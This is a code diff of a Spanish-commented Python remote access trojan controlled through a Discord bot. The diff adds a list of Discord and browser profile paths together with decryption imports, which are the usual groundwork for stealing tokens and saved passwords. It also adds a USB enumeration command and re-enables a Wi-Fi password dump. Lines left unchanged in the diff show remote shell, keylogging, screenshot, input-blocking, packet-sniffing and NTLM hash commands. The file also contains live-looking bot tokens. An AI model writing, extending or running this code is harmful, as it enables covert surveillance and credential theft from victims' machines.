@@ -21,7 +21,45 @@ import asyncio
 from scapy.all import AsyncSniffer, wrpcap, IP, TCP, UDP
 from reportlab.lib.pagesizes import letter
 from reportlab.pdfgen import canvas
-bot_token = "MTM1OTI0MDA0MjI3MDI5ODE4Nw.GlCyT5.jgr8vr-uGGBuLmvjQdwRSko4xZgNtuzqh84CuM"
+import platform
+import zipfile
+import tempfile
+import json
+import urllib.request
+import re
+import base64
+import win32crypt
+from Crypto.Cipher import AES
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+}
+
+
+bot_token = "MTM1OTI0MDA0MjI3MDI5ODE4Nw.GZqRlw.CilNSnTd-MILez79lj4cUTLY5iTMg_tCYn6hYc"
 server_id = "1358874287498330253"
 
 # Intents necesarios para que el bot funcione correctamente
@@ -30,8 +68,13 @@ intents.messages = True
 intents.guilds = True
 intents.message_content = True
 
+MAX_ZIP_SIZE = 5 * 1024 * 1024  # 5 MB
+
+
+
 bot = commands.Bot(command_prefix="!", intents=intents)
 
+usb_mounts = []
 # Función para verificar privilegios de administrador
 def is_admin():
     try:
@@ -90,6 +133,7 @@ async def myhelp(ctx):
         "**📝 Comandos Disponibles:**\n\n"
         
         "**Comandos Generales:**\n\n"
+        "--> `!usbinfo = Muestra los USB conectados con inforamación dentro\n"
         "--> `!message` = Mostrar un cuadro de mensaje con tu texto / Sintaxis: `!message ejemplo`\n"
         "--> `!shell` = Ejecutar un comando de shell / Sintaxis: `!shell whoami`\n"
         "--> `!voice` = Hacer que una voz diga en voz alta una frase personalizada / Sintaxis: `!voice prueba`\n"
@@ -298,7 +342,62 @@ async def block(ctx):
     ctypes.windll.user32.BlockInput(True)
     await ctx.send("```Teclado y ratón bloqueados.```")
 
+
+
+#Comando: Obtiene los usb conectados
+@bot.command()
+async def usbinfo(ctx):
+    """Lista los dispositivos USB conectados con su letra y nombre"""
+    global usb_mounts
+    usb_mounts = []
+
+    try:
+        system = platform.system()
+        partitions = psutil.disk_partitions()
+
+        # Lista para almacenar información detallada de los USBs
+        usb_details = []
+
+        for p in partitions:
+            # Detectar unidades de tipo "removable" (en Windows) o ubicaciones de medios montados
+            if (system == "Windows" and 'removable' in p.opts.lower()) or \
+               (system != "Windows" and any(s in p.mountpoint for s in ["/media/", "/run/media/", "/Volumes/"])):
+                
+                device_info = {
+                    "mount_point": p.mountpoint,
+                    "device": p.device
+                }
+
+                # En sistemas Windows, obtener la letra y nombre del dispositivo
+                if system == "Windows":
+                    drive_letter = p.device[0]  # La letra de la unidad será la primera parte de 'device'
+                    try:
+                        # Se intenta obtener el nombre del dispositivo
+                        drive_name = psutil.disk_partitions()[partitions.index(p)].device.split('\\')[-1]
+                    except Exception as e:
+                        drive_name = "Desconocido"  # Si no se puede obtener el nombre, asignar uno predeterminado
+
+                    device_info["drive_letter"] = drive_letter
+                    device_info["drive_name"] = drive_name
+                else:
+                    device_info["drive_name"] = p.device  # En otros sistemas, mostrar solo el nombre
+
+                usb_details.append(device_info)
+                usb_mounts.append(p.mountpoint)  # Guarda la ruta de montaje
+
+        if not usb_details:
+            await ctx.send("```No se encontraron dispositivos USB conectados.```")
+            return
+
+        # Mostrar los detalles en un formato adecuado para el usuario
+        response = "\n".join([f"{i+1}. Letra: {device['drive_letter']} | Nombre: {device['drive_name']} | Ruta: {device['mount_point']}" for i, device in enumerate(usb_details)])
+
+        await ctx.send(f"```Dispositivos USB conectados:\n{response}```")
+
+    except Exception as e:
+        await ctx.send(f"```Error al detectar USBs: {str(e)}```")
 # Comando: Desbloquear teclado y ratón
+
 @bot.command()
 async def unblock(ctx):
     if not is_admin():
@@ -509,6 +608,11 @@ async def takescreenshot(ctx):
         await ctx.send(file=discord.File("screenshot.png"))
     except Exception as e:
         await ctx.send(f"```Error: {str(e)}```")
+
+
+
+
+
 
 # Comando: Bloquear teclado y ratón (requiere admin)
 @bot.command(name="blockkeyboard")
@@ -803,8 +907,6 @@ async def network_sniff(ctx, seconds: int = 60):
 
 
 
-
-
 @bot.command()
 async def selectcam(ctx, cam_number: int):
     try:
@@ -859,8 +961,8 @@ async def keylog(ctx, seconds: int = 60):
             time.sleep(seconds)
             stop_event.set()
 
-        timer_thread = threading.Thread(target=timer)
-        timer_thread.start()
+        timer_threads = threading.Thread(target=timer)
+        timer_threads.start()
 
         # Esperar mientras se registran las teclas
         while not stop_event.is_set():
@@ -868,7 +970,7 @@ async def keylog(ctx, seconds: int = 60):
 
         # Detener el keylogger
         keyboard.unhook_all()
-        timer_thread.join()
+        timer_threads.join()
 
         # Procesar el registro
         if not log:
@@ -891,10 +993,6 @@ async def keylog(ctx, seconds: int = 60):
 
     except Exception as e:
         await ctx.send(f"❌ Error: {str(e)}")
-
-
-
-
 
 
 @bot.command()
@@ -988,7 +1086,7 @@ async def migrateprocess(ctx, process_name: str):
     except Exception as e:
         await ctx.send(f"**Error:** {str(e)}")
 
-"""# Comando: Para dumpear contraseñas de Wi-Fi
+# Comando: Para dumpear contraseñas de Wi-Fi
 @bot.command()
 async def password(ctx):
     try:
@@ -1024,9 +1122,9 @@ async def password(ctx):
             await ctx.send(f"**Contraseñas Wi-Fi encontradas:**\n" + "\n".join(wifi_passwords))
     
     except Exception as e:
-        await ctx.send(f"Error al intentar obtener las contraseñas Wi-Fi: {str(e)}")"""
+        await ctx.send(f"Error al intentar obtener las contraseñas Wi-Fi: {str(e)}")
 
-# Comando: Obtener hashes NTLM de las cuentas de usuario
+#Comando: Obtener hashes NTLM de las cuentas de usuario
 @bot.command()
 async def infocounts(ctx):
     try:
@@ -1046,5 +1144,5 @@ async def infocounts(ctx):
     except Exception as e:
         await ctx.send(f"**Error al intentar obtener información:** {str(e)}")
           
-# Ejecutar el bot
+#Ejecutar el bot
 bot.run(bot_token)
